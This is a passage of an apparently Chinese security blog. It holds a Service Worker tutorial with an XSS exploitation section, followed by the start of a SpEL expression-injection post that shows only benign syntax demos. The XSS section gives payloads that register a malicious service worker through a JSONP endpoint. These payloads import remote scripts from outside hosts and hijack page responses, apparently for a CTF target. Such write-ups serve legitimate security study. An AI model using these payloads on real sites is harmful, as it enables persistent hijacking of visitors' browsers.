      <a data-url="http://example.com/2021/10/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cku8j3fgi001xdan78k4ng5rs" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Service Worker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/Service%20Worker/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/Service%20Worker/">Service Worker</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h1><h2 id="Service-Worker-学习"><a href="#Service-Worker-学习" class="headerlink" title="Service Worker 学习"></a>Service Worker 学习</h2><h3 id="配置检查"><a href="#配置检查" class="headerlink" title="配置检查"></a>配置检查</h3><p>在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：</p>
<ul>
<li><strong>Firefox Nightly</strong>: 访问 <code>about:config</code> 并设置 <code>dom.serviceWorkers.enabled</code> 的值为 true; 重启浏览器；</li>
<li><strong>Chrome Canary</strong>: 访问 <code>chrome://flags</code> 并开启 <code>experimental-web-platform-features</code>; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；</li>
<li><strong>Opera</strong>: 访问 <code>opera://flags</code> 并开启<code> ServiceWorker 的支持</code>; 重启浏览器。 </li>
</ul>
<p>另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，<strong>Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，<code>localhost</code> 也被浏览器认为是安全源。</strong></p>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol>
<li>Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行</li>
<li>Service Workers 要求尽可能的异步操作</li>
</ol>
<h3 id="Service-Workers-的注册及安装"><a href="#Service-Workers-的注册及安装" class="headerlink" title="Service Workers 的注册及安装"></a>Service Workers 的注册及安装</h3><p>通过<code>serviceWorkerContainer.register()</code>来注册一个Service Workers</p>
<p>eg.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;serviceWorker&#x27;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  navigator.serviceWorker.register(<span class="string">&#x27;/sw-test/sw.js&#x27;</span>, &#123; <span class="attr">scope</span>: <span class="string">&#x27;/sw-test/&#x27;</span> &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">reg</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// registration worked</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Registration succeeded. Scope is &#x27;</span> + reg.scope);</span><br><span class="line">  &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// registration failed</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Registration failed with &#x27;</span> + error);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中scope为Service Workers的作用域，默认是scriptURL(<code>/sw-test/sw.js</code>)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。</p>
<p>scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ <code>Content-Type</code> 必须是 <code>text/javascript</code>）</p>
<blockquote>
<p>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</p>
</blockquote>
<p>安装过程：</p>
<p><img src="https://mdn.mozillademos.org/files/12636/sw-lifecycle.png" alt="image1496"></p>
<h3 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h3><p>Service Workers支持的事件如下</p>
<p><img src="https://mdn.mozillademos.org/files/12632/sw-events.png" alt="image1603"></p>
<p>install:安装时会触发InstallEvent</p>
<p>activate:安装事件之后调用activate事件</p>
<p>fetch:Service Workers 中的所有请求都会触发fetch事件</p>
<p>sync:当发起一个同步请求是会触发sync事件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.addEventListener(<span class="string">&#x27;install&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.waitUntil(</span><br><span class="line">    caches.open(<span class="string">&#x27;v1&#x27;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">cache</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> cache.addAll([</span><br><span class="line">        <span class="string">&#x27;/sw-test/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/index.html&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/style.css&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/app.js&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/image-list.js&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/star-wars-logo.jpg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/gallery/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/gallery/bountyHunters.jpg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/gallery/myLittleVader.jpg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sw-test/gallery/snowTroopers.jpg&#x27;</span></span><br><span class="line">      ]);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(<span class="string">&#x27;activate&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cacheWhitelist = [<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  event.waitUntil(</span><br><span class="line">    caches.keys().then(<span class="function"><span class="keyword">function</span>(<span class="params">keyList</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(keyList.map(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cacheWhitelist.indexOf(key) === -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> caches.delete(key);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;));</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> resp || fetch(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> caches.open(<span class="string">&#x27;v1&#x27;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">cache</span>) </span>&#123;</span><br><span class="line">          cache.put(event.request, response.clone());</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;);  </span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>





<h2 id="Service-Worker-With-XSS"><a href="#Service-Worker-With-XSS" class="headerlink" title="Service Worker With XSS"></a>Service Worker With XSS</h2><h3 id="XSS简单示范"><a href="#XSS简单示范" class="headerlink" title="XSS简单示范"></a>XSS简单示范</h3><p>通过Service Worker 可以持久的控制受害者</p>
<p>利用条件如下：</p>
<ol>
<li>一个xss点</li>
<li>MIME TYPE 为 application/javascript的可控页面（通常是jsonp）</li>
</ol>
<p><code>index.php?xss=navigator.serviceWorker.register(&quot;/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);&quot;);</code></p>
<p>exp.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#x27;fetch&#x27;, function(event) &#123;</span><br><span class="line">  event.respondWith(new Response(&#x27;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#x27;,&#123;headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;&#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="利用Service-Workers-控制主站及其子站点"><a href="#利用Service-Workers-控制主站及其子站点" class="headerlink" title="利用Service Workers 控制主站及其子站点"></a>利用Service Workers 控制主站及其子站点</h3><p>假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，</p>
<p>那么我们可以通过设置<code>document.domain=&quot;evil.com&quot;</code>，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers</p>
<p>A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;evil.com&quot;</span>;</span><br><span class="line">a=<span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">a.src=<span class="string">&quot;https://B.evil.com/&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.body.append(a);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].addEventListener(<span class="string">&quot;load&quot;</span>,<span class="function">()=&gt;</span>&#123;fuck()&#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="string">`navigator.serviceWorker.register(&quot;/jsonp.php?callback=self.importScripts(&#x27;//mysite.com/fuck.js&#x27;)//&quot;)`</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].contentWindow.eval(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样我们便控制住了B站点</p>
<p>fuck.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;hardxss.xhlj.wetolink.com&quot;</span>;</span><br><span class="line">a=<span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">a.src=<span class="string">&quot;https://auth.hardxss.xhlj.wetolink.com&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.body.append(a);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].addEventListener(<span class="string">&quot;load&quot;</span>,<span class="function">()=&gt;</span>&#123;fuck()&#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="string">`navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#x27;//serviceworker.free.beeceptor.com/exp.js&#x27;);//&quot;)`</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].contentWindow.eval(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>exp.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#x27;fetch&#x27;, function(event) &#123;</span><br><span class="line">  event.respondWith(new Response(&#x27;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#x27;,&#123;headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>教程：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
<p>API：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a></p>
<p><a target="_blank" rel="noopener" href="https://lightless.me/archives/XSS-With-Service-Worker.html">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/Service%20Worker/" data-id="cku8j3fgj0022dan71uuobkjs" data-title="Service Worker" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;Hello World&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());</span></span><br><span class="line">String message = (String) exp.getValue();</span><br><span class="line"><span class="comment">//String message = exp.getValue(String.class);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;Hello World&#x27;&quot;</span>);</span><br><span class="line">String message = (String) exp.getValue();</span><br></pre></td></tr></table></figure>



<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
<p>访问属性：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;123&#x27;.bytes&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>

<p>方法调用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;123&#x27;.length()&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>

<p>调用构造函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;new String(1234)&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>



<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    	Expression exp = parser.parseExpression(<span class="string">&quot;fucker+tou()&quot;</span>);</span><br><span class="line">    	System.out.println((Object)exp.getValue(<span class="keyword">new</span> Object()&#123;</span><br><span class="line">    	    <span class="keyword">public</span> String fucker=<span class="string">&quot;fucker&quot;</span>;</span><br><span class="line">    	    <span class="function"><span class="keyword">public</span> String <span class="title">tou</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	        <span class="keyword">return</span> <span class="string">&quot;toutoutou&quot;</span>;</span><br><span class="line">    	    &#125;;</span><br><span class="line">    	&#125;));</span><br></pre></td></tr></table></figure>

<p>结果：<code>fuckertoutoutou</code></p>
<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create and set a calendar</span></span><br><span class="line">GregorianCalendar c = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">c.set(<span class="number">1856</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The constructor arguments are name, birthday, and nationality.</span></span><br><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">&quot;Nikola Tesla&quot;</span>, c.getTime(), <span class="string">&quot;Serbian&quot;</span>);</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line">String name = (String) exp.getValue(context);</span><br></pre></td></tr></table></figure>

<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create and set a calendar</span></span><br><span class="line">GregorianCalendar c = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">c.set(<span class="number">1856</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The constructor arguments are name, birthday, and nationality.</span></span><br><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">&quot;Nikola Tesla&quot;</span>, c.getTime(), <span class="string">&quot;Serbian&quot;</span>);</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">String name = (String) exp.getValue(tesla);</span><br></pre></td></tr></table></figure>



<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inventions Array</span></span><br><span class="line">StandardEvaluationContext teslaContext = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Induction motor&quot;</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">&quot;inventions[3]&quot;</span>).getValue(</span><br><span class="line">		teslaContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Members List</span></span><br><span class="line">StandardEvaluationContext societyContext = <span class="keyword">new</span> StandardEvaluationContext(ieee);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Nikola Tesla&quot;</span></span><br><span class="line">String name = parser.parseExpression(<span class="string">&quot;Members[0].Name&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// List and Array navigation</span></span><br><span class="line"><span class="comment">// evaluates to &quot;Wireless communication&quot;</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">&quot;Members[0].Inventions[6]&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br></pre></td></tr></table></figure>

<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Officer&#x27;s Dictionary</span></span><br><span class="line"></span><br><span class="line">Inventor pupin = parser.parseExpression(<span class="string">&quot;Officers[&#x27;president&#x27;]&quot;</span>).getValue(</span><br><span class="line">		societyContext, Inventor.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Idvor&quot;</span></span><br><span class="line">String city = parser.parseExpression(<span class="string">&quot;Officers[&#x27;president&#x27;].PlaceOfBirth.City&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// setting values</span></span><br><span class="line">parser.parseExpression(<span class="string">&quot;Officers[&#x27;advisors&#x27;][0].PlaceOfBirth.Country&quot;</span>).setValue(</span><br><span class="line">		societyContext, <span class="string">&quot;Croatia&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java list containing the four numbers</span></span><br><span class="line">List numbers = (List) parser.parseExpression(<span class="string">&quot;&#123;1,2,3,4&#125;&quot;</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">List listOfLists = (List) parser.parseExpression(<span class="string">&quot;&#123;&#123;&#x27;a&#x27;,&#x27;b&#x27;&#125;,&#123;&#x27;x&#x27;,&#x27;y&#x27;&#125;&#125;&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>



<p>字典：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java map containing the two entries</span></span><br><span class="line">Map inventorInfo = (Map) parser.parseExpression(<span class="string">&quot;&#123;name:&#x27;Nikola&#x27;,dob:&#x27;10-July-1856&#x27;&#125;&quot;</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">Map mapOfMaps = (Map) parser.parseExpression(<span class="string">&quot;&#123;name:&#123;first:&#x27;Nikola&#x27;,last:&#x27;Tesla&#x27;&#125;,dob:&#123;day:10,month:&#x27;July&#x27;,year:1856&#125;&#125;&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>



<p>数组：</p>
<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
